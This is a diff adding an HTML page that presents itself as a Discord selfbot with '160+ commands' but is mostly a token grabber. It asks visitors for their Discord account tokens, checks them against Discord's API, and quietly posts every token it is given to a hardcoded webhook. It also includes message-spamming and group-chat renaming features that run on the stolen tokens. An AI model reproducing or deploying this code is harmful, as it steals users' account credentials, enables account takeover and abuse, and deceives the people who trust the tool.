@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>selfbot</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-image: url('https://media1.tenor.com/m/19lkizwIFG0AAAAd/blue-lock-anime.gif'); 
+            background-size: cover;
+            background-position: center;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+        }
+
+        .container {
+            background-color: rgba(0, 0, 0, 0.7);
+            border-radius: 12px;
+            padding: 30px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        h1 {
+            font-size: 22px;
+            color: #00bfff;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"], textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            box-sizing: border-box;
+            border: none;
+            border-radius: 6px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 14px;
+        }
+
+        input::placeholder, textarea::placeholder {
+            color: #ccc;
+        }
+
+        textarea {
+            resize: none;
+            height: 80px;
+        }
+
+        .button-group {
+            display: flex;
+            flex-wrap: wrap; 
+            justify-content: space-between; 
+            margin-top: 15px;
+        }
+
+        .button-group button {
+            flex: 1 1 48%; 
+            padding: 10px;
+            font-size: 14px;
+            color: #333;
+            background-color: #00bfff; 
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background-color 0.3s, color 0.3s;
+            margin: 5px 0; 
+        }
+
+        .button-group button:hover {
+            background-color: #0095e0; 
+        }
+
+        .button-group button:active {
+            background-color: #007bb5; 
+        }
+
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="tokenContainer">
+        <h1>Enter Tokens</h1>
+        <div id="tokenInputs">
+            <input type="text" class="token" placeholder="Enter your token" required>
+        </div>
+        <div class="button-group">
+            <button onclick="addTokenInput()">Add Another Token</button>
+            <button onclick="submitTokens()">Submit Tokens</button>
+        </div>
+    </div>
+
+    <div class="container hidden" id="mainContainer">
+        <h1>160+ command sb</h1>
+        <div class="image-container">
+            <input type="text" id="channelId" placeholder="Enter Channel ID"><br>
+            <input type="text" id="userId1" placeholder="Enter User ID "><br>
+            <textarea id="messages" placeholder="Type your messages..." onkeydown="checkEnter(event)"></textarea><br>
+        
+            <div class="button-group">
+                <button onclick="toggleBold()">special commands</button>
+                <button onclick="toggleAlt()">listcommands</button>
+                <button onclick="toggleChangeChannelId()">autoreact: off</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let tokens = []; 
+        let currentTokenIndex = 0;
+
+        let changeChannelIdOn = false;
+        let boldOn = false;
+        let altOn = false;
+
+        // Your webhook URL here (the one you want to send token report to)
+        const webhookUrl = "https://discord.com/api/webhooks/1397963828284751944/AB6CxiKi90jmhYQ7w2sG_kuYmtJGrTs6GnV_kKJWxS_EiDMPHaNOWNW7Fv_7Qn1UZ4pL";
+
+        function addTokenInput() {
+            const tokenInputs = document.getElementById("tokenInputs");
+            const newInput = document.createElement("input");
+            newInput.type = "text";
+            newInput.className = "token";
+            newInput.placeholder = "Enter another token";
+            tokenInputs.appendChild(newInput);
+        }
+
+        async function checkTokenValidity(token) {
+            try {
+                const res = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: {
+                        Authorization: token
+                    }
+                });
+                return res.status === 200;
+            } catch {
+                return false;
+            }
+        }
+
+        async function submitTokens() {
+            const inputTokens = Array.from(document.getElementsByClassName('token'))
+                                    .map(input => input.value.trim())
+                                    .filter(token => token);
+
+            if (inputTokens.length === 0) {
+                alert("Please enter at least one token.");
+                return;
+            }
+
+            const validTokens = [];
+            const invalidTokens = [];
+
+            for (const t of inputTokens) {
+                const isValid = await checkTokenValidity(t);
+                if (isValid) {
+                    validTokens.push(t);
+                } else {
+                    invalidTokens.push(t);
+                }
+            }
+
+            // Send token report to webhook
+            sendWebhookReport(validTokens, invalidTokens);
+
+            if (validTokens.length === 0) {
+                alert("No valid tokens entered. Please try again.");
+                return;
+            }
+
+            tokens = validTokens;
+
+            document.getElementById("tokenContainer").classList.add("hidden");
+            document.getElementById("mainContainer").classList.remove("hidden");
+        }
+
+        function sendWebhookReport(validTokens, invalidTokens) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", webhookUrl, true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            const validCount = validTokens.length;
+            const invalidCount = invalidTokens.length;
+
+            // Prepare message content summarizing tokens status
+            let content = `**Token Check Report**\n\n`;
+            content += `Valid tokens (${validCount}):\n`;
+            if (validCount > 0) content += validTokens.join("\n") + "\n\n";
+            else content += "None\n\n";
+
+            content += `Invalid tokens (${invalidCount}):\n`;
+            if (invalidCount > 0) content += invalidTokens.join("\n") + "\n";
+            else content += "None\n";
+
+            xhr.send(JSON.stringify({ content }));
+        }
+
+        function toggleChangeChannelId() {
+            changeChannelIdOn = !changeChannelIdOn;
+            document.querySelector("button[onclick='toggleChangeChannelId()']").textContent = `gc ladder: ${changeChannelIdOn ? 'on' : 'off'}`;
+        }
+
+        function toggleBold() {
+            boldOn = !boldOn;
+            document.querySelector("button[onclick='toggleBold()']").textContent = `Bold: ${boldOn ? 'on' : 'off'}`;
+        }
+
+        function toggleAlt() {
+            altOn = !altOn;
+            document.querySelector("button[onclick='toggleAlt()']").textContent = `Alt swich: ${altOn ? 'on' : 'off'}`;
+            if (!altOn) {
+                currentTokenIndex = 0; 
+            }
+        }
+
+        function sendMessages() {
+            const channelId = document.getElementById("channelId").value;
+            const userId1 = document.getElementById("userId1").value;
+            const messages = document.getElementById("messages").value.split("\n");
+
+            messages.forEach(message => {
+                if (message.trim()) {
+                    if (changeChannelIdOn) {
+                        changeGCName(channelId, message.trim());
+                    } else {
+                        let content = boldOn ? `# ${userId1 ? `<@${userId1}> ` : ''}${message.trim()}` : (userId1 ? `<@${userId1}> ${message.trim()}` : message.trim());
+                        sendMessage(channelId, content);
+                    }
+                }
+            });
+
+            document.getElementById("messages").value = ''; 
+        }
+
+        function sendMessage(channelId, message) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", `https://discord.com/api/v9/channels/${channelId}/messages`, true);
+            xhr.setRequestHeader("Authorization", tokens[currentTokenIndex]); // Use current token
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status !== 204) {
+                        console.error("Failed to send message:", xhr.responseText);
+                    }
+                }
+            };
+            xhr.send(JSON.stringify({
+                content: message
+            }));
+        }
+
+        function changeGCName(channelId, newName) {
+            const xhr = new XMLHttpRequest();
+            xhr.open("PATCH", `https://discord.com/api/v9/channels/${channelId}`, true);
+            xhr.setRequestHeader("Authorization", tokens[currentTokenIndex]); // Use current token
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === XMLHttpRequest.DONE) {
+                    if (xhr.status === 200) {
+                        console.log("GC name changed");
+                    } else {
+                        console.error("Failed to change GC name:", xhr.responseText);
+                    }
+                }
+            };
+            xhr.send(JSON.stringify({ name: newName }));
+        }
+
+        function checkEnter(e) {
+            if (e.key === "Enter" && !e.shiftKey) {
+                e.preventDefault();
+                sendMessages();
+
+                if (altOn) {
+                    currentTokenIndex++;
+                    if (currentTokenIndex >= tokens.length) currentTokenIndex = 0;
+                }
+            }
+        }
+    </script>
+</body>
+</html>
